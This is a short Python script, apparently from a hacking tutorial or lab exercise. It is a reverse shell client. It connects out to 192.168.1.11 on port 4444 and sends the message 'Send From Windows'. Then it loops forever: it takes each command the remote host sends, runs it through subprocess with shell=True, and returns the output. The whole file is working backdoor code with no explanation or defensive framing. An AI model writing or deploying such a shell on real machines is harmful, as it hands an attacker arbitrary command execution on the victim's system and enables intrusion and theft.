import socket,subprocess


connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("192.168.1.11",4444))

def execute_command(command):
    return subprocess.check_output(command,shell=True)

connection.send("\nSend From Windows\n")

while True:
    command = connection.recv(1024)
    command_result = execute_command(command)
    connection.send(command_result)

connection.close()